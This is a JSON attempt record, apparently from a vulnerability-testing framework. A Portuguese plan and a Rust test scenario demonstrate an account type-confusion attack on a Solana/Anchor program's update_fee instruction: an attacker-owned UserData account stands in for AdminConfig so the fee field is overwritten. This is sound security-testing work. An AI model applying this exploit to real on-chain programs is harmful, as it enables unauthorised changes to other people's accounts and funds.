attempts.raw:
{
  "plan": "Preparamos uma conta AdminConfig legítima com admin = carteira legítima e fee = 100, e uma conta UserData com authority = carteira do atacante e balance = 0. O baseline chama update_fee com a AdminConfig e a carteira legítima como signer, provando que o cenário está montado corretamente. O ataque chama update_fee passando a UserData no lugar da AdminConfig, assinada pela carteira do atacante (que é o authority da UserData). Se a vulnerabilidade existir, a instrução terá sucesso e o campo fee_basis_points da UserData (bytes 40..48) será sobrescrito com o novo valor, demonstrando o dano.",
  "scenario": "let program_id = env.program_id;

let legit_admin = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

let admin_config_data = anchor_account_data("AdminConfig", &(legit_admin, 100u64));
let user_data_data = anchor_account_data("UserData", &(attacker, 0u64));

let admin_config = account(&program_id, &admin_config_data, None);
let user_data = account(&program_id, &user_data_data, None);

let legit_wallet = wallet(1_000_000_000);
let attacker_wallet = wallet(1_000_000_000);

let new_fee: u64 = 9999;

let ix_baseline = env.anchor_ix(
    "update_fee",
    &(new_fee,),
    vec![
        AccountMeta::new(admin_config.clone().get_key(), false),
        AccountMeta::new_readonly(legit_admin, true),
    ],
);

let baseline_accounts = vec![
    (admin_config.clone().get_key(), admin_config.clone()),
    (legit_admin, legit_wallet),
];

let baseline_result = env.baseline(
    "legit update_fee with AdminConfig and legit admin",
    &ix_baseline,
    &baseline_accounts,
);

let ix_attack = env.anchor_ix(
    "update_fee",
    &(new_fee,),
    vec![
        AccountMeta::new(user_data.clone().get_key(), false),
        AccountMeta::new_readonly(attacker, true),
    ],
);

let attack_accounts = vec![
    (user_data.clone().get_key(), user_data.clone()),
    (attacker, attacker_wallet),
];

let attack_result = env.attack(
    "update_fee with UserData cosplaying as AdminConfig",
    &ix_attack,
    &attack_accounts,
);

if attack_result.program_result == ProgramResult::Success {
    let user_data_after = after(&attack_result, &user_data.get_key());
    let fee_after = read_u64(user_data_after.data(), 40);
    env.effect(
        "UserData fee_basis_points overwritten by unauthorized update_fee",
        fee_after == new_fee,
    );
}"
}

